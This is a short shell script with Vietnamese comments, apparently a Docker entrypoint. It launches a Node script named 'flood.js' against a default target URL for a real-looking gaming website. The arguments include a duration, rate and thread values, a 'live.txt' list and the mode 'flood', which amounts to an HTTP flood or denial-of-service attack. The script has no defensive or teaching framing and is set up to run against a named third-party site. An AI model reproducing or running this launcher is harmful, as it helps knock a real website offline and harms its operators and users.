#!/bin/sh

# Kiểm tra biến môi trường URL, nếu không có thì dùng mặc định
TARGET_URL=${TARGET_URL:-"https://mixigaming.com/"}

echo "🔹 Đang chạy flood.js với URL: $TARGET_URL"
node /RunScriptDocker/flood.js "$TARGET_URL" 120 10 10 /RunScriptDocker/live.txt flood || echo "✅ Script đã hoàn thành!"
